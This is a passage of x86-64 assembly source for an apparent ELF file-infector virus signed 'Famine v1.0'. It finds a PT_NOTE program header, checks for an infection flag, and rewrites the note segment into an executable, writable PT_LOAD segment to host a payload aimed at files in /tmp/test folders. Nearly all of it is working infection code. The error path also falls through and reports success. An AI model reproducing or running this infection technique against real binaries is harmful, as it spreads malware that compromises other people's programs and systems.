		imul rcx, rsi				; 		...
		add rax, rcx				; 		...
		mov [res_header], rax			; res_header = cur_phdr;

		; check if PT_NOTE
		mov rdi, [res_header]			; if (cur_phdr->p_type != PT_NOTE)
		add rdi, elf64_phdr.p_type		; ...
		mov eax, [rdi]				; ...
		cmp eax, PT_NOTE			; ...
		jne .next_phdr_loop			; 	goto next_phdr_loop;

		jmp .found				; goto found;

	.next_phdr_loop:
		inc rsi					; i++;
		cmp rsi, [e_phnum]			; if (i == e_phnum)
		je .not_found				; 	goto not_found;
		jmp .begin_phdr_loop			; }

	.not_found:
		xor rax, rax				; res = 0;
		jmp .end				; goto end

	.found:
		mov rax, [res_header]			; res = res_header;
		jmp .end				; goto end

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return res;


; int has_signature(char const *file_map)
; rax has_signature(rdi file_map);
has_signature:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local e_phoff:qword				; long e_phoff;
	%local e_phentsize:qword			; long e_phentsize;
	%local e_phnum:qword				; long e_phnum;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
	mov [e_phoff], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
	mov [e_phentsize], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
	mov [e_phnum], rax				; ...

	; loop through program headers
	xor rsi, rsi					; i = 0;
	.begin_phdr_loop:				; while (true) {
		mov rax, [file_map]			; cur_phdr = file_map
		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
		imul rcx, rsi				; 		...
		add rax, rcx				; 		...

		; check if PT_FAMINE
		mov rdi, rax				; if (!(cur_phdr->p_flag & PF_FAMINE))
		add rdi, elf64_phdr.p_flags		; ...
		mov eax, [rdi]				; ...
		and eax, PF_FAMINE			; ...
		cmp eax, PF_FAMINE			; ...
		jne .next_phdr_loop			; 	goto next_phdr_loop;

		jmp .found				; goto found;

	.next_phdr_loop:
		inc rsi					; i++;
		cmp rsi, [e_phnum]			; if (i == e_phnum)
		je .not_found				; 	goto not_found;
		jmp .begin_phdr_loop			; }

	.not_found:
		xor rax, rax				; res = 0;
		jmp .end				; goto end

	.found:
		mov rax, 1				; res = 1;
		jmp .end				; goto end

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return res;

; bool convert_pt_note_to_load(char const *_file_map,
;			       Elf64_Off _new_offset,
;			       Elf64_Addr _new_vaddr,
;			       uint64_t _filesz,
;			       uint64_t _memsz)
; bool convert_pt_note_to_load(rdi _file_map,
;			       rsi _new_offset,
;			       rdx _new_vaddr,
;			       rcx _filesz,
;			       r8 _memsz);
; TODO: _memsz Will be useful if we do compression. Else, this parameter is equal to _filesz
convert_pt_note_to_load:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local new_offset:qword				; Elf64_Off new_offset;
	%local new_vaddr:qword				; Elf64_Addr new_vaddr;
	%local filesz:qword				; uint64_t filesz;
	%local memsz:qword				; uint64_t memsz;
	%local note_segment:qword			; elf64_phdr *note_segment;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov [new_offset], rsi				; new_offset = _new_offset;
	mov [new_vaddr], rdx				; new_vaddr = _new_vaddr;
	mov [filesz], rcx				; new_filesz = _new_filesz;
	mov [memsz], r8					; new_memsz = _new_memsz;

	call find_note_segment				; _ret = find_note_seggment(file_map);
	cmp rax, 0					; if (_ret == NULL)
	je .err						; 	goto .end_err;

	mov rdi, rax					; _type_ptr = &_note_segment->p_flags;
	add rdi, elf64_phdr.p_type			; ...
	mov DWORD [rdi], PT_LOAD			; *_type_ptr = PT_LOAD;

	mov rdi, rax					; _flags_ptr = _note_segment->p_flags;
	add rdi, elf64_phdr.p_flags			; ...
	mov DWORD [rdi], PF_X | PF_W | PF_R | PF_FAMINE	; *_flags_ptr = PF_X | PF_W | PF_R | PF_FAMINE;

	mov rdi, rax					; _offset_ptr = _note_segment->p_offset;
	add rdi, elf64_phdr.p_offset			; ...
	mov rsi, [new_offset]				; *_offset_ptr = new_offset;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _vaddr_ptr = _note_segment->p_vaddr;
	add rdi, elf64_phdr.p_vaddr			; ...
	mov rsi, [new_vaddr]				; *_vaddr_ptr = new_vaddr;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _paddr_ptr = _note_segment->p_paddr;
	add rdi, elf64_phdr.p_paddr			; ...
	mov rsi, [new_vaddr]				; *_paddr_ptr = new_vaddr;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _filesz_ptr = _note_segment->p_filesz;
	add rdi, elf64_phdr.p_filesz			; ...
	mov rsi, [filesz]				; *_filesz_ptr = filesz;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _memsz_ptr = _note_segment->p_memsz;
	add rdi, elf64_phdr.p_memsz			; ...
	mov rsi, [memsz]				; *_memsz_ptr = memsz;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _align_ptr = _note_segment->p_align;
	add rdi, elf64_phdr.p_align			; ...
	mov QWORD [rdi], PAGE_SIZE			; *_align_ptr = PAGE_SIZE;

	jmp .success

.err:
	xor rax, rax					; _ret = false;

.success:
	mov rax, 1					; _ret = true;

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return _ret;
section .data
	infected_folder_1: db "/tmp/test/", 0
	infected_folder_2: db "/tmp/test2/", 0
	err_msg: db "Error occured !", 10
	len_err_msg: equ $ - err_msg
	elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
	len_elf_64_magic: equ $ - elf_64_magic
	; never used but here to be copied in the binary
	test_compression_delete_me: db "AAAAAAAAAAAAAA" ; TODO This is a test for compression, delete this
	signature: db "Famine v1.0 by jmaia and dhubleur"

_end_payload:
